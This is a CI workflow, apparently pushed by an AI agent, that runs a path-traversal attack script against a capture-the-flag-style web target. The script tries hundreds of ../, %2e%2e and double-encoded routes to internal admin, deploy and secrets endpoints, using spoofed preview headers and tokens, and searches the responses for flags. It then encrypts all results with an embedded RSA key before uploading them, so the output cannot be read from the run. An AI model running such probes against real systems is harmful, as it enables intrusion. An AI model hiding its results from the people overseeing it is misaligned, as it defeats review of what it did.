name: launchlet-part3-canonical-bypass
on:
  push:
    branches: [agent/launchlet-part3-canonical-bypass-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe normalized internal deploy routes and encrypt hits
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out')
          s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
          h={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':'launchlet-demo-board','apikey':'ll_anon_mock_publishable','Authorization':'Bearer preview_guest_session'}
          payload={'deployRef':'preview-8b11c','receipt':'lrec_preview_demo_2026','workspaceId':'ws-launchlet-internal','projectId':'launchlet-demo-board','actionId':'act_6f4b9a2c1d0e8a71'}
          tails=['internal','admin','private','ops','enterprise','production','release','deploy','deployment','preview']
          leaves=['deploy','deployment','export','release','publish','promote','inspect','inspector','finalize','approve','open','resolve','artifact','artifacts','preview','status','metadata','manifest','secrets','flag']
          paths=[]
          for t in tails:
            for l in leaves:
              target=f'{t}/{l}'
              paths += [f'/api/actions/../{target}',f'/api/public/../{target}',f'/api/preview/../{target}',f'/api/foo/../{target}',f'/api/actions/%2e%2e/{target}',f'/api/actions/%252e%252e/{target}']
          # also likely single internal endpoints
          for t in ['internal','admin']:
            for l in ['deploy/export','deploy/release','deploy/inspect','release/export','deployment/export','preview/export']:
              paths += [f'/api/actions/../{t}/{l}',f'/api/public/../{t}/{l}']
          paths=list(dict.fromkeys(paths));hits=[]
          for p in paths:
            for m in ['GET','POST']:
              try:r=s.request(m,base+p,headers=h,json=payload if m=='POST' else None,timeout=6,allow_redirects=False)
              except Exception:continue
              if not (r.status_code==404 and r.text in ('{"error":"not_found"}','404 page not found\n')):
                item={'path':p,'method':m,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};hits.append(item)
                flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
                if flags:(out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
            if (out/'FOUND.txt').exists():break
          (out/'summary.json').write_text(json.dumps({'tested_paths':len(paths),'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-canonical-bypass-encrypted
          path: artifact/
          retention-days: 1
